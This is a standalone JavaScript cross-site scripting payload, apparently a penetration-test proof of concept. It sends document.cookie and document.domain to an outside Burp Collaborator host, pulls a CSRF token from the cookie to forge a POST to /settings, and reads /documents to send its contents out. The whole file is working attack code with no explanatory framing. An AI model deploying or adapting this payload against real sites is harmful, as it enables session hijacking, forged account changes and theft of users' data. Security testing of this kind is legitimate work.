leak = function(name, data)
{
   var i = document.createElement('img');
   i.src = "https://yxz1eqvtp27ov7r4y4qdkmmyqpwqkf.burpcollaborator.net?" + name + "=" + btoa(data);
   document.body.appendChild(i);	
}

leak("document.domain",document.domain);
leak("document.cookie",document.cookie);

var csrf = document.cookie.split('=')[1];

var XHR = new XMLHttpRequest();
var FD  = new FormData();

FD.append("_csrf_token", csrf);
FD.append("name", "testing");
FD.append("user_id", "61");

XHR.addEventListener('error', function( event ) {
    leak("error_event","Something went wrong.");
});

XHR.onload = function() {
   if (XHR.status != 200) {
      leak("onload_post_error",`POST Error ${XHR.status}: ${XHR.statusText}`);
   } else {
      leak("onload_post",`POST Done, got ${XHR.response.length} bytes: ${XHR.response}`);
   }
};

XHR.open('POST', '/settings');
XHR.send(FD);

var XHR2 = new XMLHttpRequest();
XHR2.open('GET', '/documents');
XHR2.onload = function() {
   if (XHR2.status != 200) {
      leak("onload_get_error",`GET Error ${XHR2.status}: ${XHR2.statusText}`);
   } else {
      leak("onload_get",`GET Done, got ${XHR2.response.length} bytes: ${XHR2.response}`);
   }
};
XHR2.send();

